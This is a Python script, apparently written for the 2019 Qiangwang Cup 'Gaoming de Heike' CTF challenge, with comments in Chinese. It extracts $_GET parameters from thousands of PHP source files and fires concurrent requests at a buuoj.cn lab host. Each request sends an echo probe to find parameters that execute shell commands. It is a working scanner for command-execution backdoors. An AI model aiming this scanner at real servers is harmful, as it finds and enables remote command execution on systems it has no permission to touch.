#!/usr/bin/env python3
import os
import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

BASE_URL = "http://06eb6af2-149b-4b03-aa9f-8015ffcb155a.node5.buuoj.cn:81"
SRC_DIR = "/home/lls/data/ctf-agent/challenges/154_强网杯_2019_高明的黑客/src"

def get_all_params(filepath):
    """获取文件中所有 GET 参数"""
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()
    return set(re.findall(r"\$_GET\['(\w+)'\]", content))

def test_file(filename):
    """测试一个文件的所有参数"""
    params = get_all_params(os.path.join(SRC_DIR, filename))
    if not params:
        return None
    
    url = f"{BASE_URL}/{filename}"
    
    for param in params:
        try:
            # 测试命令执行
            test_val = "echo%20SHELLTEST12345"
            r = requests.get(f"{url}?{param}={test_val}", timeout=3)
            if "SHELLTEST12345" in r.text:
                return (filename, param, 'command_exec')
        except:
            pass
    return None

def main():
    files = [f for f in os.listdir(SRC_DIR) if f.endswith('.php')]
    print(f"[*] 测试 {len(files)} 个PHP文件...")
    
    results = []
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(test_file, f): f for f in files}
        for i, future in enumerate(as_completed(futures)):
            if i % 500 == 0:
                print(f"[*] 进度: {i}/{len(files)}")
            result = future.result()
            if result:
                print(f"[+] 找到: {result}")
                results.append(result)
    
    print(f"\n[*] 完成，找到 {len(results)} 个可利用点")
    return results

if __name__ == '__main__':
    main()
